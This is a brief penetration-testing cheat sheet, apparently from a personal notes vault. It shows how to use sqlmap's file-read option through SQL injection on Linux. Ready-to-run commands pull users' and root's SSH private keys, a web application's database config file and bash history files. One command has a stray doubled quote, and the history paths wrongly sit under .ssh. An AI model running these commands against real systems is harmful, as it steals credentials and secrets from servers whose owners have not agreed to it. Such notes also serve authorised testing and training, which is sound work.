# Linux

Search Tag(s): #sqlmap #enumeration-and-discovery #credential-access-and-dumping

## Conditions

1. The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
2. **Note:** Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## Automated

- Retrieve SSH keys

```
$ sqlmap -u "<URL>" --random-agent --file-read="/home/<username>/.ssh/id_rsa"

$ sqlmap -u "<URL>" --random-agent --file-read="/root/.ssh/id_rsa"
```

- Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[Content Management System (CMS)#^bc9e6e|database config file]] after enumeration phase for the web root directory.

```
$ sqlmap -u "<URL>" --random-agent --file-read="/var/www/html/dvwa/config.php"
```

- Retrieve history commands. You can find more in the [[Content Management System (CMS)|privilege escalation credentials]] section.

```
$ sqlmap -u "<URL>"" --random-agent --file-read="/home/<username>/.ssh/.bash_history"

$ sqlmap -u "<URL>" --random-agent --file-read="/root/.ssh/.bash_history"
```